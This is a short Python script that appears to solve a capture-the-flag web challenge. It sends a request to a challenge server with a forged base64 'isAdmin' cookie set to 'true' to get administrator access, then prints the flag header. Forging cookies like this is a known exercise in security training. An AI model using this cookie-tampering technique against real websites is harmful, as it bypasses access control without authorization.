import requests

cookie = {
    "isAdmin": "dHJ1ZQ==",
    "PHPSESSID": "tdm0588of8nesbrf2hv62ghe24"
}

response = requests.get("http://chall.ctf-ehcon.ml:32102/dashboard.php", cookies=cookie)

print(response.headers['Flag'])
